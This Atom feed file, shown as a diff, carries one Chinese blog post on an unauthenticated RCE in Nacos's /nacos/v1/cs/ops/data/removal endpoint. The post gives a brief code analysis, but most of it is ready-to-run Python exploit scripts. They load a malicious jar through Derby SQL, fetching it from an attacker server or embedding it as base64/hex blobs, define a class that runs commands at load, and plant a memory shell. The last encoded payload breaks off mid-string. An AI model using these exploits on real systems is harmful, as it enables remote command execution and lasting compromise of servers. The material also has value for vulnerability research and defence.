@@ -1,0 +1,469 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://mtcz91.github.io</id>
+    <title>MTCZ91</title>
+    <updated>2024-07-27T23:40:18.685Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://mtcz91.github.io"/>
+    <link rel="self" href="https://mtcz91.github.io/atom.xml"/>
+    <subtitle>功不唐捐</subtitle>
+    <logo>https://mtcz91.github.io/images/avatar.png</logo>
+    <icon>https://mtcz91.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, MTCZ91</rights>
+    <entry>
+        <title type="html"><![CDATA[NACOS GITHUB 0day漏洞]]></title>
+        <id>https://mtcz91.github.io/post/nacos-github-0day-lou-dong/</id>
+        <link href="https://mtcz91.github.io/post/nacos-github-0day-lou-dong/">
+        </link>
+        <updated>2024-07-22T14:55:49.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="一-漏洞简介">一、漏洞简介</h1>
+<p>​	nacos 是一个开源的微服务发现、管理、配置平台， <code>/nacos/v1/cs/ops/data/removal</code>接口可以未授权访问，此接口可以执行用户上传文件的任意SQL语句，导致RCE漏洞。</p>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="一-漏洞简介">一、漏洞简介</h1>
+<p>​	nacos 是一个开源的微服务发现、管理、配置平台， <code>/nacos/v1/cs/ops/data/removal</code>接口可以未授权访问，此接口可以执行用户上传文件的任意SQL语句，导致RCE漏洞。</p>
+<!-- more -->
+<h2 id="二-影响版本">二、影响版本</h2>
+<p>​	&lt;= v2.4.0</p>
+<p>​	&lt;= v2.3.2</p>
+<h2 id="三-环境搭建">三、环境搭建</h2>
+<p>​	使用 vulhub 的docker 环境，8848 为nacos端口，5005为远程调试端口。</p>
+<pre><code class="language-yaml">version: &quot;2&quot;
+services:
+  web:
+    image: vulhub/nacos:1.4.0
+    ports:
+      - &quot;8848:8848&quot;
+      - &quot;5005:5005&quot;
+</code></pre>
+<h2 id="四-漏洞原理分析">四、漏洞原理分析</h2>
+<p>​	在接口  <code>/nacos/v1/cs/ops/data/removal</code> 中下断点，可以看到用户上传的文件传入了 <code>WebUtils.onFileUpload</code> 方法</p>
+<figure data-type="image" tabindex="1"><img src="https://mtcz91.github.io/post-images/1721746829191.png" alt="" loading="lazy"></figure>
+<p>​	跟进 <code>WebUtils.onFileUpload</code> 方法，创建了一个临时文件，然后将临时文件传给<code>consumer.accept</code>方法，此方法作为消费者异步读取使用临时文件，然后<code>finally</code>删除临时文件，此处存在bug，可能在读取临时文件前就被删除了，所以在POC中需要通过条件竞争，多次上传文件，在删除文件前读取到上传的文件内容。</p>
+<figure data-type="image" tabindex="2"><img src="https://mtcz91.github.io/post-images/1721746842027.png" alt="" loading="lazy"></figure>
+<p>​	继续执行，查看上面消费者使用临时文件的过程，此处是一个lambda表达式，临时文件被传入了<code>databaseOperate.dataImport</code>方法</p>
+<figure data-type="image" tabindex="3"><img src="https://mtcz91.github.io/post-images/1721746851867.png" alt="" loading="lazy"></figure>
+<p>​	跟进<code>databaseOperate.dataImport</code>方法，即<code>com\alibaba\nacos\config\server\service\repository\embedded\StandaloneDatabaseOperateImpl.java#dataImport</code>，对临时文件每一行内容进行了读取，然后<code>doDataImport(jdbcTemplate, sqls)</code>执行了文件中每行的SQL</p>
+<figure data-type="image" tabindex="4"><img src="https://mtcz91.github.io/post-images/1721746860634.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://mtcz91.github.io/post-images/1721746868786.png" alt="" loading="lazy"></figure>
+<h2 id="五-漏洞复现">五、漏洞复现</h2>
+<p>​	POC如下，命令行执行 <code>python poc.py -t http://your-ip:8848 -s http://vps-ip/evil.jar -c &quot;ps aux&quot;  </code></p>
+<figure data-type="image" tabindex="6"><img src="https://mtcz91.github.io/post-images/1721746878597.png" alt="" loading="lazy"></figure>
+<pre><code class="language-python">import random
+import sys
+import requests
+from urllib.parse import urljoin
+import argparse
+
+
+def exploit(target, command, service):  
+    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
+    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
+    for i in range(0, sys.maxsize):
+        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
+        post_sql = f&quot;&quot;&quot;CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)
+CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.{id}')
+CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'
+&quot;&quot;&quot;
+        get_sql = f&quot;select * from (select count(*) as b, S_EXAMPLE_{id}('{command}') as a from config_info) tmp /*ROWS FETCH NEXT*/&quot;
+        files = {'file': post_sql}
+        post_resp = requests.post(url=removal_url, files=files)
+        post_json = post_resp.json()
+        if post_json.get('message', None) is None and post_json.get('data', None) is not None:
+            print(post_resp.text)
+            get_resp = requests.get(url=derby_url, params={'sql': get_sql})
+            print(get_resp.text)
+            break
+
+
+def main():
+    parser = argparse.ArgumentParser(description='Exploit script for Nacos CVE-2021-29442')
+    parser.add_argument('-t', '--target', required=True, help='Target URL')
+    parser.add_argument('-c', '--command', required=True, help='Command to execute')
+    parser.add_argument('-s', '--service', required=True, help='Service URL')
+    
+    args = parser.parse_args()
+    
+    exploit(args.target, args.command, args.service)
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<p>​	恶意jar包可将如下java文件编译后打包为<code>evil.jar</code></p>
+<pre><code class="language-java">//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by Fernflower decompiler)
+//
+
+package test.poc;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.io.StringWriter;
+
+public class Example {
+    public Example() {
+    }
+
+    public static void main(String[] args) {
+        String ret = exec(&quot;ipconfig&quot;);
+        System.out.println(ret);
+    }
+
+    public static String exec(String cmd) {
+        StringBuffer bf = new StringBuffer();
+
+        try {
+            String charset = &quot;utf-8&quot;;
+            String osName = System.getProperty(&quot;os.name&quot;);
+            if (osName != null &amp;&amp; osName.startsWith(&quot;Windows&quot;)) {
+                charset = &quot;gbk&quot;;
+            }
+
+            Process p = Runtime.getRuntime().exec(cmd);
+            InputStream fis = p.getInputStream();
+            InputStreamReader isr = new InputStreamReader(fis, charset);
+            BufferedReader br = new BufferedReader(isr);
+            String line = null;
+
+            while((line = br.readLine()) != null) {
+                bf.append(line);
+            }
+        } catch (Exception var10) {
+            StringWriter writer = new StringWriter();
+            PrintWriter printer = new PrintWriter(writer);
+            var10.printStackTrace(printer);
+
+            try {
+                writer.close();
+                printer.close();
+            } catch (IOException var9) {
+            }
+
+            return &quot;ERROR:&quot; + writer.toString();
+        }
+
+        return bf.toString();
+    }
+}
+</code></pre>
+<h2 id="六-不出网利用">六、不出网利用</h2>
+<ol>
+<li>通过 <code>data/removal</code>接口创建 UDF 命令执行函数，然后使用 <code>/nacos/v1/cs/ops/derby</code>（CVE-2021-29442）接口执行UDF函数，执行命令示例<code>python poc.py -t http://127.0.0.1:8848 -c &quot;touch /tmp/mtcz91&quot;</code></li>
+</ol>
+<pre><code class="language-python">import random
+import sys
+import requests
+from urllib.parse import urljoin
+import argparse
+import base64
+
+
+def exploit(target, command): 
+    #base64编码的恶意类
+    payload = b'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' 
+    payload = base64.b64decode(payload).hex()
+    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
+    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
+    for i in range(0, sys.maxsize):
+        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
+        post_sql = f&quot;&quot;&quot;
+        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values CAST (X''{payload}'' AS BLOB)', '/tmp/evil', ',' ,'&quot;', 'UTF-8', '/tmp/evil.jar')
+        CALL sqlj.install_jar('/tmp/evil.jar', 'NACOS.{id}', 0)
+        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.{id}')
+        CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'
+        &quot;&quot;&quot;
+        get_sql = f&quot;select * from (select count(*) as b, S_EXAMPLE_{id}('{command}') as a from config_info) tmp /*ROWS FETCH NEXT*/&quot;
+        files = {'file': post_sql}
+        post_resp = requests.post(url=removal_url, files=files)
+        post_json = post_resp.json()
+        if post_json.get('message', None) is None and post_json.get('data', None) is not None:
+            print(post_resp.text)
+            get_resp = requests.get(url=derby_url, params={'sql': get_sql})
+            print(get_resp.text)
+            break
+
+
+def main():
+    parser = argparse.ArgumentParser(description='Exploit script for Nacos CVE-2021-29442')
+    parser.add_argument('-t', '--target', required=True, help='Target URL')
+    parser.add_argument('-c', '--command', required=True, help='Command to execute')
+    
+    args = parser.parse_args()
+    
+    exploit(args.target, args.command)
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<ol start="2">
+<li>通过<code>data/removal</code>接口创建存储过程，然后调用存储过程执行命令，此处需要注意<code>test.poc.Example.exec</code>返回值类型为void，执行命令示例<code>python poc.py -t http://127.0.0.1:8848 -c &quot;touch /tmp/mtcz91&quot;</code></li>
+</ol>
+<pre><code class="language-python">import random
+import sys
+import requests
+from urllib.parse import urljoin
+import argparse
+import base64
+
+
+def exploit(target, command): 
+    #base64编码的恶意类
+    payload = b'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' 
+    payload = base64.b64decode(payload).hex()
+    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
+    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
+    for i in range(0, sys.maxsize):
+        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
+        post_sql = f&quot;&quot;&quot;
+        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values CAST (X''{payload}'' AS BLOB)', '/tmp/evil', ',' ,'&quot;', 'UTF-8', '/tmp/evil.jar')
+        CALL sqlj.install_jar('/tmp/evil.jar', 'NACOS.{id}', 0)
+        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.{id}')
+        DROP PROCEDURE SALES.TOTAL_REVENUES
+        CREATE PROCEDURE SALES.TOTAL_REVENUES(PARAM VARCHAR(2000)) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'
+        CALL SALES.TOTAL_REVENUES('{command}')
+        &quot;&quot;&quot;
+        files = {'file': post_sql}
+        post_resp = requests.post(url=removal_url, files=files)
+        post_json = post_resp.json()
+        if post_json.get('message', None) is None and post_json.get('data', None) is not None:
+            print(post_resp.text)
+            break
+
+
+def main():
+    parser = argparse.ArgumentParser(description='Exploit script for Nacos CVE-2021-29442')
+    parser.add_argument('-t', '--target', required=True, help='Target URL')
+    parser.add_argument('-c', '--command', required=True, help='Command to execute')
+    
+    args = parser.parse_args()
+    
+    exploit(args.target, args.command)
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<h2 id="七-不落地-jar-包利用">七、不落地 jar 包利用</h2>
+<p>​	通过<code>data/removal</code>接口创建<code>defineClass</code>方法，传入base64编码的类字节码，创建恶意类并执行恶意类static代码块，其中包含命令执行代码。</p>
+<p>EvilClass.java</p>
+<pre><code class="language-java">public class EvilClass {
+    static {
+        try {
+            Runtime.getRuntime().exec(&quot;touch /tmp/mtcz91&quot;);
+        } catch (Exception e) {
+            System.out.println(e);
+        }
+    }
+}
+</code></pre>
+<p>编译并base64编码</p>
+<pre><code class="language-bash">javac MaliciousClass.java
+cat MaliciousClass.class | base64
+</code></pre>
+<p>⽣成最终payload，替换{class_name} 与{class_code}</p>
+<p>poc.py</p>
+<pre><code class="language-python">import random
+import sys
+import requests
+from urllib.parse import urljoin
+import argparse
+import base64
+
+
+def exploit(target, command): 
+    #base64编码的恶意类
+    class_code = 'yv66vgAAADQAKgoACQATCgAUABUIABYKABQAFwcAGAkAGQAaCgAbABwHAB0HAB4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAYAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAKAAsHAB8MACAAIQEAEXRvdWNoIC90bXAvbXRjejkxDAAiACMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAkDAAlACYHACcMACgAKQEACUV2aWxDbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWACEACAAJAAAAAAACAAEACgALAAEADAAAAB0AAQABAAAABSq3AAGxAAAAAQANAAAABgABAAAAAQAIAA4ACwABAAwAAABSAAIAAQAAABW4AAISA7YABFenAAtLsgAGKrYAB7EAAQAAAAkADAAFAAIADQAAABYABQAAAAQACQAHAAwABQANAAYAFAAIAA8AAAAHAAJMBwAQBwABABEAAAACABI=' 
+    class_name = 'EvilClass'
+    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
+    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
+    for i in range(0, sys.maxsize):
+        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
+        post_sql = f&quot;&quot;&quot;create type typeClass external name 'java.lang.Class' language java
+create type typeClassLoader external name 'java.lang.ClassLoader' language java
+create function base64Decode(className VARCHAR(32672)) returns VARCHAR(32672) FOR BIT DATA external name 'org.springframework.util.Base64Utils.decodeFromString' language java parameter style java
+create function getSystemClassLoader() returns typeClassLoader external name 'java.lang.ClassLoader.getSystemClassLoader' language java parameter style java
+create function defineClass(className VARCHAR(32672),bytes VARCHAR(32672) FOR BIT DATA,loader typeClassLoader) returns typeClass external name 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)' language java parameter style java
+create table test(v typeClass)
+insert into test values (defineClass('{class_name}',base64Decode('{class_code}'),getSystemClassLoader()))
+&quot;&quot;&quot;
+        files = {'file': post_sql}
+        post_resp = requests.post(url=removal_url, files=files)
+        post_json = post_resp.json()
+        if post_json.get('message', None) is None and post_json.get('data', None) is not None:
+            print(post_resp.text)
+            break
+
+
+def main():
+    parser = argparse.ArgumentParser(description='Exploit script for Nacos CVE-2021-29442')
+    parser.add_argument('-t', '--target', required=True, help='Target URL')
+    parser.add_argument('-c', '--command', required=True, help='Command to execute')
+    
+    args = parser.parse_args()
+    
+    exploit(args.target, args.command)
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="E:%5C%E7%A0%94%E7%A9%B6%E6%8A%A5%E5%91%8A%5Cnacos%5C7.png" alt="" loading="lazy"></figure>
+<h2 id="八-注入内存马利用">八、注入内存马利用</h2>
+<p>​	通过<code>data/removal</code>接口传入16进制编码的jar包，植入内存马。<code>python poc.py -t http://127.0.0.1:8848 -c &quot;touch /tmp/mtcz91&quot;</code></p>
+<figure data-type="image" tabindex="8"><img src="https://mtcz91.github.io/post-images/1721746908503.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://mtcz91.github.io/post-images/1721746918590.png" alt="" loading="lazy"></figure>
+<p>poc.py</p>
+<pre><code class="language-python">import random
+import sys
+import requests
+from urllib.parse import urljoin
+import argparse
+import base64
+
+
+def exploit(target, command): 
+    #base64编码的恶意类
+    payload = '504b03041400080808004160f258000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5f24dccccd375ce492c2eb65228014aeb15e427ebb95624e616e4a4f272f1720100504b07087f64045e3800000037000000504b03040a00000800004160f258000000000000000000000000040000006f72672f504b03040a00000800004160f2580000000000000000000000000d0000006f72672f61706163686567762f504b03041400080808004160f258000000000000000000000000210000006f72672f61706163686567762f5369676e61747572655574696c732e636c6173739d7909801cc775ddafbd66b0185c4b02e48017481124b8b38bb9af250c72eebbe73e6949ec99e9397baeee9e531775903a2debb22c52a22953b220d9724849ce02342c929622d291a3d872144b8962c77102598a1227ce69d212e15f3db38b5d60492a0176baabab7efdfac7fbbfaa7f7ffb95df7f16004ce473fbe0bfc3df29e17f2cc3ff84ffa584ffad84ffa380ffab84bf5f8625786919cec2cbcbd0817fd80f3f839fef8757e0325e08601f21f432a720f30ab2b00c47e0650559549225daab50c0a3cb701d512ac93e64449695643fed5729c901257c44410e2ec3ade4d07e72187e4e5b477021b2b20c763ae33a5c8b5caf2447298763b4f30625b95149d44a725c09ef56909b96619ddc4c476fa1a3b752ceb72d83959ca08fb7d3c73be8e50df472a7829c54c2e715e42e057c6e1fb99b9ca244f72c9355a25190b565ec59a70fa715444be9754aa2a77783921815f0d4323111336a472cf4825259e9dd462f767ad950927b29c3334af24bf47e5649ee5392fb157049491c0ae25c860c358c6b1972c4ad209e6528102fbdf87084f8e92540970b2e9310d1d0cb11ca26ac20117a6796a144dd6027512aa4921a33465b7105492c43035e5290e432f0248536a10f69eaad97092c7023ae44e0ae53e1063b60b53cdbae6a9392506f57efbde7da2ea47775ca1c8143e17a9b63faad2227a4d8228f3d2be14e89e533ac50a7cfb3cef952ab4c87f660a4aa72928b674591615b4879fda9bd97936a7591c02de18e50d5b25db654e3aa036db25e6db3525fe0d2529d1791ec103273b22267314d6722f03ca312d795ea9db6a82019024b67eaedba7416453a750f3e2af9ba28716d4ed82d5db4d8e04a123254943a6d891b4948396ba11487a7947d5c541bc6f948776cb7d6e3ee96e6775e457be6da55cee2fc0349892d35236c579e866e5190ac82e4305850056aa12d3156b6ecb373f58526373650116b75be2c706d02d7ed20f2b3620d392